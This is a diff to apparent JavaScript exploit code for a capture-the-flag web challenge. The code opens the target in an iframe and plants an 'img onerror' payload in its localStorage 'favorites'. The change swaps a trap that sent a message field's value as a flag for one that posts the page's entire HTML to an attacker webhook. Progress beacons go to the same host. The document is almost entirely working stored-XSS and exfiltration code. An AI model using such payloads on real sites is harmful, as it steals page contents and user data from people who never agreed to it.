@@ -51,13 +51,13 @@
                     "i.src='https://match.owley-madison.jeopardy.websec.saarland/';" +
                     "i.onload=function(){" +
                         "new Image().src='" + W + "/?step=5_iframe_ready';" +
-                        "var trap = \"var wait=setInterval(function(){" +
-                                   "  var m=parent.document.getElementById('message');" +
-                                   "  if(m && m.value.length > 5){" + 
-                                   "    new Image().src='" + W + "/?flag='+encodeURIComponent(m.value);" +
-                                   "    clearInterval(wait);" +
-                                   "  }" +
-                                   "}, 500);\";" +
+                        
+                        // THE VACUUM TRAP: Ping Step 7, then POST the entire Chat DOM to the webhook
+                        "var trap = \"new Image().src='" + W + "/?step=7_chat_xss_fired'; " +
+                                   "var x=new XMLHttpRequest(); " +
+                                   "x.open('POST', '" + W + "'); " +
+                                   "x.send(document.documentElement.innerHTML);\";" +
+                                   
                         "var p = '</option><img src=x onerror=\"' + trap + '\">';" +
                         "i.contentWindow.localStorage.setItem('favorites', JSON.stringify([p]));" +
                         "new Image().src='" + W + "/?step=6_poisoned_redirecting';" +
